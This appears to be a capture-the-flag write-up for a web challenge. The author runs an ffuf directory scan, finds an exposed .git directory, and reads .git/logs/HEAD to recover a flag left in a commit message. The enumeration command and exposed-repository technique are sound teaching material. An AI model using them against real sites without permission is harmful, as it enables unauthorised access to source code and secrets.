## On page "http://leak4.chal.deti:8013" i saw
```
Build host

Release v1.4.2
changelog
```

## Method
- The first thing i tought was click on the changelog to get some clues, but it just returned 404
- Then I saw the "Release v1.4.2" and tought that maybe it had some route like "/v1.4.2" or "/v1-4-2" or something similar but all of them return 404 
- Then I went for enumeration method and used ffuf 
```

s24@s24:~$ ffuf -u http://leak4.chal.deti:8013/FUZZ -w /usr/share/dirb/wordlists/common.txt -ac

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://leak4.chal.deti:8013/FUZZ
 :: Wordlist         : FUZZ: /usr/share/dirb/wordlists/common.txt
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.git/HEAD               [Status: 200, Size: 23, Words: 2, Lines: 2, Duration: 27ms]
                        [Status: 200, Size: 77, Words: 4, Lines: 1, Duration: 31ms]
:: Progress: [4614/4614] :: Job [1/1] :: 1129 req/sec :: Duration: [0:00:04] :: Errors: 0 ::

```

- So there is something at "http://leak4.chal.deti:8013/.git/HEAD", i go and it is a file
- The file contents are 
```

ref: refs/heads/master

```

- The next thing I tried was http://leak4.chal.deti:8013/.git/refs/heads/master, it worked and was another file with the contents
```
eea9eb57e2f69daf2c11f03f5830653f12dcfa1c
```

- I assume it is the hash of a commit

- I also got some other files like .git/config and .git/logs/HEAD

- The .git/logs/HEAD had this content 
```
0000000000000000000000000000000000000000 e187934516e118fac1099d67bf66ce1855fde013 dev <dev@acme.internal> 1791494218 +0000	commit (initial): temp: add flag flag{g1t_h1story_l34ks} for testing
e187934516e118fac1099d67bf66ce1855fde013 eea9eb57e2f69daf2c11f03f5830653f12dcfa1c dev <dev@acme.internal> 1791494218 +0000	commit: chore: remove temp flag
```
- As you can see the flag is there

## Reproduce
- Go to "http://leak4.chal.deti:8013/.git/logs/HEAD"
- Open the file that it downloader
- Flag is there
